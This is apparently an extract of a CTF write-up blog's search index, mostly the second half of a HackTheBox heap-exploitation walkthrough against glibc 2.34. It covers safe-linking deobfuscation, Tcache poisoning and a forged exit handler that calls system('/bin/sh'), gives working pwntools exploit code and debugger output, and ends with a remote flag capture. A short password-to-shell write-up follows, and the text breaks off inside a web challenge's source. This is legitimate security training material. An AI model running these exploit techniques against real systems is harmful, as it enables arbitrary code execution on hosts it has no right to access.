0x0000000000000000 0x0000000000000000 0x5594e6cb40a0: 0x0000000000000000 0x0000000000000000 0x5594e6cb40b0: 0x0000000000000000 0x0000000000000000 0x5594e6cb40c0: 0x0000000a66647361 0x0000000000000000 0x5594e6cb40d0: 0x0000000000000000 0x0000000000000000 0x5594e6cb40e0: 0x0000000000000000 0x0000000000000000  So, the users array starts at 0x5594e6cb4060. There are 12 slots, and the next one corresponds to the crsid global variable (notice we entered asdf\\n, 0x0a66647361 in hexadecimal little-endian format).\nExploit development At this point, we can get a leak of an obfuscated fd pointer and the fd pointer of the Small Bin chunk so that we can compute the base address of the heap and Glibc, respectively. This is the state of the heap:\npwndbg\u0026gt; vis_heap_chunks 0x5594e7ebc000 0x0000000000000000 0x0000000000000291 ................ 0x5594e7ebc010 0x0006000000000000 0x0000000000000000 ................ 0x5594e7ebc020 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc030 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc040 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc050 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc060 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc070 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc080 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc090 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc0a0 0x0000000000000000 0x00005594e7ebc340 ........@....U.. 0x5594e7ebc0b0 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc0c0 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc0d0 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc0e0 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc0f0 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc100 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc110 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc120 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc130 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc140 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc150 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc160 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc170 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc180 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc190 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc1a0 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc1b0 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc1c0 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc1d0 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc1e0 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc1f0 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc200 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc210 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc220 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc230 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc240 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc250 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc260 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc270 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc280 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc290 0x0000000000000000 0x0000000000000051 ........Q....... \u0026lt;-- smallbins[0x50][0] 0x5594e7ebc2a0 0x00007fb2c71d2d00 0x00007fb2c71d2d00 .-.......-...... 0x5594e7ebc2b0 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc2c0 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc2d0 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc2e0 0x0000000000000050 0x0000000000000050 P.......P....... 0x5594e7ebc2f0 0x00005591bea5bd00 0x0000000000000000 .....U.......... 0x5594e7ebc300 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc310 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc320 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc330 0x0000000000000000 0x0000000000000051 ........Q....... 0x5594e7ebc340 0x00005591bea5bd2c 0x6685522b4639b16f ,....U..o.9F+R.f \u0026lt;-- tcachebins[0x50][0/6] 0x5594e7ebc350 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc360 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc370 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc380 0x0000000000000000 0x0000000000000051 ........Q....... 0x5594e7ebc390 0x00005591bea5bd5c 0x6685522b4639b16f \\....U..o.9F+R.f \u0026lt;-- tcachebins[0x50][1/6] 0x5594e7ebc3a0 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc3b0 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc3c0 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc3d0 0x0000000000000000 0x0000000000000051 ........Q....... 0x5594e7ebc3e0 0x00005591bea5ba8c 0x6685522b4639b16f .....U..o.9F+R.f \u0026lt;-- tcachebins[0x50][2/6] 0x5594e7ebc3f0 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc400 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc410 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc420 0x0000000000000000 0x0000000000000051 ........Q....... 0x5594e7ebc430 0x00005591bea5ba3c 0x6685522b4639b16f \u0026lt;....U..o.9F+R.f \u0026lt;-- tcachebins[0x50][3/6] 0x5594e7ebc440 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc450 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc460 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc470 0x0000000000000000 0x0000000000000051 ........Q....... 0x5594e7ebc480 0x00005591bea5ba6c 0x6685522b4639b16f l....U..o.9F+R.f \u0026lt;-- tcachebins[0x50][4/6] 0x5594e7ebc490 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc4a0 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc4b0 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc4c0 0x0000000000000000 0x0000000000000051 ........Q....... 0x5594e7ebc4d0 0x00000005594e7ebc 0x6685522b4639b16f .~NY....o.9F+R.f \u0026lt;-- tcachebins[0x50][5/6] 0x5594e7ebc4e0 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc4f0 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc500 0x0000000000000000 0x0000000000000000 ................ 0x5594e7ebc510 0x0000000000000000 0x0000000000020af1 ................ \u0026lt;-- Top chunk  Leaking memory addresses First, let\u0026rsquo;s get the base address of the heap:\nedit(p, 0, b'A') fd=u64(show(p, 0)[1:].ljust(8, b'\\0')) heap_base_addr=deobfuscate(fd) \u0026lt;\u0026lt;8 log.success(f'Heap base address: {hex(heap_base_addr)}')  $ python3 solve.py [*] './crsid' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' [+] Starting local process './crsid': pid 968613 [*] running in new terminal: ['/usr/bin/gdb', '-q', './crsid', '968613', '-x', '/tmp/pwn0ajdf_fe.gdb'] [+] Waiting for debugger: Done [+] Heap base address: 0x55a9f0608000 [*] Switching to interactive mode ========================= [1] Create username [2] Delete username [3] Edit username [4] Show username [5] Change your CRSid [6] Exit ========================= [#] $  Reading symbols from ./crsid... (No debugging symbols found in ./crsid) Attaching to program: ./crsid, process 968613 Reading symbols from ./glibc/libc.so.6... Reading symbols from ./glibc/ld-2.34.so... 0x00007fe28ae745ce in __GI___libc_read (fd=0, buf=0x55a9ef27d0c0, nbytes=32) at ../sysdeps/unix/sysv/linux/read.c:26 26 ../sysdeps/unix/sysv/linux/read.c: No such file or directory. ^C Program received signal SIGINT, Interrupt. 0x00007fe28ae745ce in __GI___libc_read (fd=0, buf=0x7fe28af67b03 \u0026lt;_IO_2_1_stdin_+131\u0026gt;, nbytes=1) at ../sysdeps/unix/sysv/linux/read.c:26 26 in ../sysdeps/unix/sysv/linux/read.c  pwndbg\u0026gt; vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x55a9ef279000 0x55a9ef27a000 r--p 1000 0 ./crsid 0x55a9ef27a000 0x55a9ef27b000 r-xp 1000 1000 ./crsid 0x55a9ef27b000 0x55a9ef27c000 r--p 1000 2000 ./crsid 0x55a9ef27c000 0x55a9ef27d000 r--p 1000 2000 ./crsid 0x55a9ef27d000 0x55a9ef27e000 rw-p 1000 3000 ./crsid 0x55a9f0608000 0x55a9f0629000 rw-p 21000 0 [heap] 0x7fe28ad78000 0x7fe28ad7b000 rw-p 3000 0 [anon_7fe28ad78] 0x7fe28ad7b000 0x7fe28ada7000 r--p 2c000 0 ./glibc/libc.so.6 0x7fe28ada7000 0x7fe28af0e000 r-xp 167000 2c000 ./glibc/libc.so.6 0x7fe28af0e000 0x7fe28af63000 r--p 55000 193000 ./glibc/libc.so.6 0x7fe28af63000 0x7fe28af64000 ---p 1000 1e8000 ./glibc/libc.so.6 0x7fe28af64000 0x7fe28af67000 r--p 3000 1e8000 ./glibc/libc.so.6 0x7fe28af67000 0x7fe28af6a000 rw-p 3000 1eb000 ./glibc/libc.so.6 0x7fe28af6a000 0x7fe28af79000 rw-p f000 0 [anon_7fe28af6a] 0x7fe28af79000 0x7fe28af7a000 r--p 1000 0 ./glibc/ld-2.34.so 0x7fe28af7a000 0x7fe28af9e000 r-xp 24000 1000 ./glibc/ld-2.34.so 0x7fe28af9e000 0x7fe28afa8000 r--p a000 25000 ./glibc/ld-2.34.so 0x7fe28afa8000 0x7fe28afaa000 r--p 2000 2e000 ./glibc/ld-2.34.so 0x7fe28afaa000 0x7fe28afac000 rw-p 2000 30000 ./glibc/ld-2.34.so 0x7ffe144aa000 0x7ffe144cb000 rw-p 21000 0 [stack] 0x7ffe14521000 0x7ffe14525000 r--p 4000 0 [vvar] 0x7ffe14525000 0x7ffe14527000 r-xp 2000 0 [vdso] 0xffffffffff600000 0xffffffffff601000 --xp 1000 0 [vsyscall]  Everything looks correct. Notice that index 0 is the only chunk we have allocated (heap base address plus 0x2f0), and we need to overwrite a null byte with another character (for example an A) in order to show it (strings in C terminate with a null byte).\nOnce we have this heap base address, we can modify the crsid and point to the freed Small Bin chunk (heap base address plus 0x2a0), so that we can leak Glibc in a similar way:\nchange(p, p64(heap_base_addr+0x2a0)) edit(p, 12, b'A') main_arena_addr=u64(show(p, 12).replace(b'A', b'\\0').ljust(8, b'\\0')) -160 glibc.address=main_arena_addr-glibc.sym.main_arena log.success(f'Glibc base address: {hex(glibc.address)}')  $ python3 solve.py [*] './crsid' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' [+] Starting local process './crsid': pid 977485 [*] running in new terminal: ['/usr/bin/gdb', '-q', './crsid', '977485', '-x', '/tmp/pwnwu1c1ein.gdb'] [+] Waiting for debugger: Done [+] Heap base address: 0x5569130e9000 [+] Glibc base address: 0x7f83f9b54000 [*] Switching to interactive mode ========================= [1] Create username [2] Delete username [3] Edit username [4] Show username [5] Change your CRSid [6] Exit ========================= [#] $  Reading symbols from ./crsid... (No debugging symbols found in ./crsid) Attaching to program: ./crsid, process 977485 Reading symbols from ./glibc/libc.so.6... Reading symbols from ./glibc/ld-2.34.so... 0x00007f83f9c4d5ce in __GI___libc_read (fd=0, buf=0x5569116230c0, nbytes=32) at ../sysdeps/unix/sysv/linux/read.c:26 26 ../sysdeps/unix/sysv/linux/read.c: No such file or directory. ^C Program received signal SIGINT, Interrupt. 0x00007f83f9c4d5ce in __GI___libc_read (fd=0, buf=0x7f83f9d40b03 \u0026lt;_IO_2_1_stdin_+131\u0026gt;, nbytes=1) at ../sysdeps/unix/sysv/linux/read.c:26 26 in ../sysdeps/unix/sysv/linux/read.c  pwndbg\u0026gt; vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x55691161f000 0x556911620000 r--p 1000 0 ./crsid 0x556911620000 0x556911621000 r-xp 1000 1000 ./crsid 0x556911621000 0x556911622000 r--p 1000 2000 ./crsid 0x556911622000 0x556911623000 r--p 1000 2000 ./crsid 0x556911623000 0x556911624000 rw-p 1000 3000 ./crsid 0x5569130e9000 0x55691310a000 rw-p 21000 0 [heap] 0x7f83f9b51000 0x7f83f9b54000 rw-p 3000 0 [anon_7f83f9b51] 0x7f83f9b54000 0x7f83f9b80000 r--p 2c000 0 ./glibc/libc.so.6 0x7f83f9b80000 0x7f83f9ce7000 r-xp 167000 2c000 ./glibc/libc.so.6 0x7f83f9ce7000 0x7f83f9d3c000 r--p 55000 193000 ./glibc/libc.so.6 0x7f83f9d3c000 0x7f83f9d3d000 ---p 1000 1e8000 ./glibc/libc.so.6 0x7f83f9d3d000 0x7f83f9d40000 r--p 3000 1e8000 ./glibc/libc.so.6 0x7f83f9d40000 0x7f83f9d43000 rw-p 3000 1eb000 ./glibc/libc.so.6 0x7f83f9d43000 0x7f83f9d52000 rw-p f000 0 [anon_7f83f9d43] 0x7f83f9d52000 0x7f83f9d53000 r--p 1000 0 ./glibc/ld-2.34.so 0x7f83f9d53000 0x7f83f9d77000 r-xp 24000 1000 ./glibc/ld-2.34.so 0x7f83f9d77000 0x7f83f9d81000 r--p a000 25000 ./glibc/ld-2.34.so 0x7f83f9d81000 0x7f83f9d83000 r--p 2000 2e000 ./glibc/ld-2.34.so 0x7f83f9d83000 0x7f83f9d85000 rw-p 2000 30000 ./glibc/ld-2.34.so 0x7ffe2b384000 0x7ffe2b3a5000 rw-p 21000 0 [stack] 0x7ffe2b3ea000 0x7ffe2b3ee000 r--p 4000 0 [vvar] 0x7ffe2b3ee000 0x7ffe2b3f0000 r-xp 2000 0 [vdso] 0xffffffffff600000 0xffffffffff601000 --xp 1000 0 [vsyscall]  Again, it is correct. Now, we have all the necessary addresses to continue with exploitation.\nTcache exploitation The next thing we must achieve is Tcache poisoning. For that, let\u0026rsquo;s empty the Tcache:\nforiinrange(7): create(p)  And we have te Tcache empty and these pointers in users and crsid:\n$ python3 solve.py [*] './crsid' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' [+] Starting local process './crsid': pid 984349 [*] running in new terminal: ['/usr/bin/gdb', '-q', './crsid', '984349', '-x', '/tmp/pwnjz4wily7.gdb'] [+] Waiting for debugger: Done [+] Heap base address: 0x555637f8e000 [+] Glibc base address: 0x7f5479945000 [*] Switching to interactive mode A new username appeared! ========================= [1] Create username [2] Delete username [3] Edit username [4] Show username [5] Change your CRSid [6] Exit ========================= [#] $  Reading symbols from ./crsid... (No debugging symbols found in ./crsid) Attaching to program: ./crsid, process 984349 Reading symbols from ./glibc/libc.so.6... Reading symbols from ./glibc/ld-2.34.so... 0x00007f5479a3e5ce in __GI___libc_read (fd=0, buf=0x555636f9c0c0, nbytes=32) at ../sysdeps/unix/sysv/linux/read.c:26 26 ../sysdeps/unix/sysv/linux/read.c: No such file or directory. ^C Program received signal SIGINT, Interrupt. 0x00007f5479a3e5ce in __GI___libc_read (fd=0, buf=0x7f5479b31b03 \u0026lt;_IO_2_1_stdin_+131\u0026gt;, nbytes=1) at ../sysdeps/unix/sysv/linux/read.c:26 26 in ../sysdeps/unix/sysv/linux/read.c  pwndbg\u0026gt; bins tcachebins empty fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x0 0x80: 0x0 unsortedbin all: 0x0 smallbins empty largebins empty pwndbg\u0026gt; x/20gx \u0026stderr 0x555636f9c040 \u0026lt;stderr\u0026gt;: 0x00007f8fbb275680 0x0000000000000000 0x555636f9c050: 0x0000000000000000 0x0000000000000000 0x555636f9c060: 0x0000555637f8e2f0 0x0000555637f8e340 0x555636f9c070: 0x0000555637f8e390 0x0000555637f8e3e0 0x555636f9c080: 0x0000555637f8e430 0x0000555637f8e480 0x555636f9c090: 0x0000555637f8e4d0 0x0000555637f8e2a0 0x555636f9c0a0: 0x0000000000000000 0x0000000000000000 0x555636f9c0b0: 0x0000000000000000 0x0000000000000000 0x555636f9c0c0: 0x0000555637f8e2a0 0x0000000000000000 0x555636f9c0d0: 0x0000000000000000 0x0000000000000000  Notice that index 7 points to the same chunk as crsid. Hence, we can free it and modify the fd pointer using index 12 (crsid), which is a Write After Free primitive.\nIn other heap challenges, at this point we would enter the address of __malloc_hook or __free_hook in the fd pointer, so that we can allocate a chunk in that address and add data to the hooks. Unfortunately, Glibc 2.34 doesn\u0026rsquo;t use hooks in order to prevent these kind of exploits.\nExit handlers Therefore, we need to come up with another technique to achieve code execution. While doing some research on ways to exploit Glibc 2.34, I found this one from Aero CTF 2022. This write-up uses a technique to enter a malicious function in __exit_funcs list, so that when calling exit, the program executes the malicious function (for example system(\u0026quot;/bin/sh\u0026quot;)). More information here.\nThis technique requires to leak the address of the legitimate exit function. This address is encrypted using XOR and bit rotations. The following lambda functions (adapted from the previous write-up) are needed to decrypt the real address:\nrol=lambdaval, r_bits, max_bits: \\ (val\u0026lt;\u0026lt;r_bits%max_bits) \u0026amp;(2**max_bits-1) |\\ ((val\u0026amp;(2**max_bits-1)) \u0026gt;\u0026gt;(max_bits-(r_bits%max_bits))) ror=lambdaval, r_bits, max_bits: \\ ((val\u0026amp;(2**max_bits-1)) \u0026gt;\u0026gt;r_bits%max_bits) |\\ (val\u0026lt;\u0026lt;(max_bits-(r_bits%max_bits)) \u0026amp;(2**max_bits-1)) encrypt=lambdavalue, key: rol(value^key, 0x11, 64)  These are some relevant addresses:\npwndbg\u0026gt; x/gx \u0026__exit_funcs 0x7f5479b31818 \u0026lt;__exit_funcs\u0026gt;: 0x00007f5479b33bc0 pwndbg\u0026gt; x/10gx 0x00007f5479b33bc0 0x7f5479b33bc0 \u0026lt;initial\u0026gt;: 0x0000000000000000 0x0000000000000001 0x7f5479b33bd0 \u0026lt;initial+16\u0026gt;: 0x0000000000000004 0xbf6103b40d295794 0x7f5479b33be0 \u0026lt;initial+32\u0026gt;: 0x0000000000000000 0x0000000000000000 0x7f5479b33bf0 \u0026lt;initial+48\u0026gt;: 0x0000000000000000 0x0000000000000000 0x7f5479b33c00 \u0026lt;initial+64\u0026gt;: 0x0000000000000000 0x0000000000000000 pwndbg\u0026gt; p initial $1 = { next = 0x0, idx = 1, fns = {{ flavor = 4, func = { at = 0xbf6103b40d295794, on = { fn = 0xbf6103b40d295794, arg = 0x0 }, cxa = { fn = 0xbf6103b40d295794, arg = 0x0, dso_handle = 0x0 } } }, { flavor = 0, func = { at = 0x0, on = { fn = 0x0, arg = 0x0 }, cxa = { fn = 0x0, arg = 0x0, dso_handle = 0x0 } } } \u0026lt;repeats 31 times\u0026gt;} }  We can get the offsets for these addresses:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; hex(0x7f5479b31818 - 0x7f5479945000) '0x1ec818' \u0026gt;\u0026gt;\u0026gt; hex(0x00007f5479b33bc0 - 0x7f5479945000) '0x1eebc0'  And the exit handler that is legitimately called is _dl_fini (encrypted as 0xbf6103b40d295794), whose real address can be seen once it is called because it is not populated until the exit process:\n$ python3 solve.py [*] './crsid' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' [+] Starting local process './crsid': pid 1002383 [*] running in new terminal: ['/usr/bin/gdb', '-q', './crsid', '1002383', '-x', '/tmp/pwnw5eak7gl.gdb'] [+] Waiting for debugger: Done [+] Heap base address: 0x555c0fed2000 [+] Glibc base address: 0x7f3e4a692000 [*] Switching to interactive mode A new username appeared! ========================= [1] Create username [2] Delete username [3] Edit username [4] Show username [5] Change your CRSid [6] Exit ========================= [#] $ 6 [*] Got EOF while reading in interactive $  Reading symbols from ./crsid... (No debugging symbols found in ./crsid) Attaching to program: ./crsid, process 1002383 Reading symbols from ./glibc/libc.so.6... Reading symbols from ./glibc/ld-2.34.so... 0x00007f3e4a78b5ce in __GI___libc_read (fd=0, buf=0x555c0fa860c0, nbytes=32) at ../sysdeps/unix/sysv/linux/read.c:26 26 ../sysdeps/unix/sysv/linux/read.c: No such file or directory. [Inferior 1 (process 1002383) exited normally] pwndbg\u0026gt; p _dl_fini $1 = {void (void)} 0x7f3e4a8a0350 \u0026lt;_dl_fini\u0026gt;  And this is the offset:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; hex(0x7f3e4a8a0350 - 0x7f3e4a692000) '0x20e350'  Once we have these addresses, we need to leak the original exit function address (encrypted) in order to obtain the encryption key. This can be done with Tcache poisoning. Notice that the new fd pointer must be obfuscated accordingly due to safe-linking:\n__exit_funcs=glibc.address+0x1ec818 exit_handler_addr=glibc.address+0x1eebc0 _dl_fini=glibc.address+0x20e350 log.info(f'__exit_funcs address: {hex(__exit_funcs)}') log.info(f'Original exit handler address: {hex(exit_handler_addr)}') log.info(f'_dl_fini address: {hex(_dl_fini)}') delete(p, 1) delete(p, 7) edit(p, 12, p64(obfuscate(exit_handler_addr, heap_base_addr))) create(p) create(p) edit(p, 7, b'A'*24) encrypted_function=u64(show(p, 7)[24:]) key=ror(encrypted_function, 0x11, 64) ^_dl_fini log.info(f'Encrypted function: {hex(encrypted_function)}') log.info(f'Encryption key: {hex(key)}') log.info(f'Sanity check: {hex(encrypt(_dl_fini, key))}')  For the leakage, we need to edit the initial exit handler to overwrite null bytes and be able to leak the encrypted function address of _dl_fini. As a sanity check, we can encrypt it again using the same encryption key:\n$ python3 solve.py [*] './crsid' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' [+] Starting local process './crsid': pid 1010243 [*] running in new terminal: ['/usr/bin/gdb', '-q', './crsid', '1010243', '-x', '/tmp/pwnh755srzo.gdb'] [+] Waiting for debugger: Done [+] Heap base address: 0x55baf8a08000 [+] Glibc base address: 0x7fb3cbbdd000 [*] __exit_funcs address: 0x7fb3cbdc9818 [*] Original exit handler address: 0x7fb3cbdcbbc0 [*] _dl_fini address: 0x7fb3cbdeb350 [*] Encrypted function: 0xf1d7f8de6d77d8cd [*] Encryption key: 0xec66875837b185eb [*] Sanity check: 0xf1d7f8de6d77d8cd [*] Switching to interactive mode ========================= [1] Create username [2] Delete username [3] Edit username [4] Show username [5] Change your CRSid [6] Exit ========================= [#] $  Reading symbols from ./crsid... (No debugging symbols found in ./crsid) Attaching to program: ./crsid, process 1010243 Reading symbols from ./glibc/libc.so.6... Reading symbols from ./glibc/ld-2.34.so... 0x00007fb3cbcd65ce in __GI___libc_read (fd=0, buf=0x55baf6eb40c0, nbytes=32) at ../sysdeps/unix/sysv/linux/read.c:26 26 ../sysdeps/unix/sysv/linux/read.c: No such file or directory. ^C Program received signal SIGINT, Interrupt. 0x00007fb3cbcd65ce in __GI___libc_read (fd=0, buf=0x7fb3cbdc9b03 \u0026lt;_IO_2_1_stdin_+131\u0026gt;, nbytes=1) at ../sysdeps/unix/sysv/linux/read.c:26 26 in ../sysdeps/unix/sysv/linux/read.c  pwndbg\u0026gt; x/6gx \u0026initial 0x7fb3cbdcbbc0 \u0026lt;initial\u0026gt;: 0x4141414141414141 0x4141414141414141 0x7fb3cbdcbbd0 \u0026lt;initial+16\u0026gt;: 0x4141414141414141 0xf1d7f8de6d77d8cd 0x7fb3cbdcbbe0 \u0026lt;initial+32\u0026gt;: 0x0000000000000000 0x0000000000000000  So everything looks good. Now we need to craft a payload to fake an exit handler function (encrypting the function address accordingly). Notice that we can use system as a function and \u0026quot;/bin/sh\u0026quot; as the first argument:\npayload=p64(0) payload+=p64(1) payload+=p64(4) payload+=p64(encrypt(glibc.sym.system, key)) payload+=p64(next(glibc.search(b'/bin/sh')))  Also, this is the users array:\npwndbg\u0026gt; x/20gx \u0026stderr 0x556e3bbd5040 \u0026lt;stderr\u0026gt;: 0x00007fb3cbdca680 0x0000000000000000 0x556e3bbd5050: 0x0000000000000000 0x0000000000000000 0x556e3bbd5060: 0x000055baf8a082f0 0x000055baf8a082a0 0x556e3bbd5070: 0x000055baf8a08390 0x000055baf8a083e0 0x556e3bbd5080: 0x000055baf8a08430 0x000055baf8a08480 0x556e3bbd5090: 0x000055baf8a084d0 0x00007fb3cbdcbbc0 0x556e3bbd50a0: 0x0000000000000000 0x0000000000000000 0x556e3bbd50b0: 0x0000000000000000 0x0000000000000000 0x556e3bbd50c0: 0x000055baf8a082a0 0x0000000000000000 0x556e3bbd50d0: 0x0000000000000000 0x0000000000000000  Finally, we need to allocate the payload in a chunk (we know the exact address) and perform another Tcache poisoning attack to write this address the into __exit_funcs list (index 1 and index 12 of the users array point to the same chunk). To trigger the attack, we just need to exit the program:\npayload_pointer=heap_base_addr+0x2f0 delete(p, 2) delete(p, 1) edit(p, 12, p64(obfuscate(__exit_funcs-8, heap_base_addr))) create(p) create(p) edit(p, 2, p64(0) +p64(payload_pointer)) p.sendlineafter(b'[#] ', b'6') p.interactive()  $ python3 solve.py [*] './crsid' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' [+] Starting local process './crsid': pid 1022768 [+] Heap base address: 0x55f7bb0f9000 [+] Glibc base address: 0x7fa8ff28a000 [*] __exit_funcs address: 0x7fa8ff476818 [*] Original exit handler address: 0x7fa8ff478bc0 [*] _dl_fini address: 0x7fa8ff498350 [*] Encrypted function: 0x30c6a2802fa23f4c [*] Encryption key: 0x1fa667cbae099481 [*] Sanity check: 0x30c6a2802fa23f4c [*] Switching to interactive mode $ ls crsid glibc solve.py  Flag And it works locally. Let\u0026rsquo;s try remotely:\n$ python3 solve.py 159.65.83.93:31667 [*] './crsid' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' [+] Opening connection to 159.65.83.93 on port 31667: Done [+] Heap base address: 0x55b95c204000 [+] Glibc base address: 0x7fb89c8eb000 [*] __exit_funcs address: 0x7fb89cad7818 [*] Original exit handler address: 0x7fb89cad9bc0 [*] _dl_fini address: 0x7fb89caf9350 [*] Encrypted function: 0x8ce2b8ac78fe460f [*] Encryption key: 0x2307b9c9c0f9af2f [*] Sanity check: 0x8ce2b8ac78fe460f [*] Switching to interactive mode $ ls crsid flag.txt glibc $ cat flag.txt HTB{L1bC-2.34,S4f3_l1nKinG_4nD_O0B-g0_brrr}  The full exploit script can be found in here: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/pwn/crsid/","section":"ctf","summary":"64-bit binary. Heap exploitation. Safe-linking. Out-of-bounds write. Tcache poisoning. Exit handlers","time":22,"title":"CRSid"},{"contents":"We are given a binary called meeting:\n$ file meeting meeting: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=72d8b06e4ca750d5c24395d3349c3121b9b95283, for GNU/Linux 3.2.0, not stripped  Reverse engineering Using Ghidra, we can read the decompiled source code in C. This is the main function:\nintmain() { intret; char*pointer; charinput_data[64];  setvbuf(stdout, NULL, 2, 0); puts(\"\\x1b[3mYou knock on the door and a panel slides back\\x1b[0m\"); puts(\u0026amp;DAT_00102040); fwrite(\"\\\"What is the password for this week\\'s meeting?\\\"\", 1, 0x30, stdout); fgets(input_data, 0x40, stdin); pointer =strchr(input_data, 0xa); *pointer ='\\0'; ret =strcmp(input_data, \"sup3r_s3cr3t_p455w0rd_f0r_u!\"); if(ret ==0) { puts(\"\\x1b[3mThe panel slides closed and the lock clicks\\x1b[0m\"); puts(\"| | \\\"Welcome inside...\\\"\"); system(\"/bin/sh\"); } else{ puts(\" \\\\/\"); puts(\u0026amp;DAT_00102130); } return0; }  Basically, the program asks for a password, and the expected password is hard-coded: sup3r_s3cr3t_p455w0rd_f0r_u!.\nOnce we enter the valid password system(\u0026quot;/bin/sh\u0026quot;) will be executed.\nFlag Let\u0026rsquo;s connect to the server and read the flag:\n$ nc 161.35.172.25 31802 You knock on the door and a panel slides back |/👁️ 👁️ \\|A hooded figure looks out at you \"What is the password for this week's meeting?\" sup3r_s3cr3t_p455w0rd_f0r_u! sup3r_s3cr3t_p455w0rd_f0r_u! The panel slides closed and the lock clicks | | \"Welcome inside...\" /bin/sh: 0: can't access tty; job control turned off $ ls ls flag.txt meeting $ cat flag.txt cat flag.txt HTB{1nf1ltr4t1ng_4_cul7_0f_str1ng5}  ","image":"/images/reversing.png","permalink":"https://7rocky.github.io/en/ctf/other/hackthebooctf/cult-meeting/","section":"ctf","summary":"Key written in a binary","time":1,"title":"Cult Meeting"},{"contents":"We are given this website:\nStatic code analysis We are provided with the JavaScript source code of the web application, built in Node.js with Express JS. This is routes/index.js:\nconstexpress=require('express'); constrouter=express.Router({ caseSensitive: true}); constAuthMiddleware =require('../middleware/AuthMiddleware'); constbot =require('../bot'); letdb; constresponse=data=\u0026gt;({ message: data}); router.get('/', (req, res) =\u0026gt;{ returnres.render('index.html'); }); router.post('/api/submit', (req, res) =\u0026gt;{ const{ halloween_name, email, costume_type, trick_or_treat} =req.body; if(halloween_name\u0026amp;\u0026amp;email\u0026amp;\u0026amp;costume_type\u0026amp;\u0026amp;trick_or_treat) { returndb.party_request_add(halloween_name, email, costume_type, trick_or_treat) .then(() =\u0026gt;{ res.send(response('Your request will be reviewed by our team!')); bot.visit(); }) .catch(() =\u0026gt;res.send(response('Something Went Wrong!'))); } 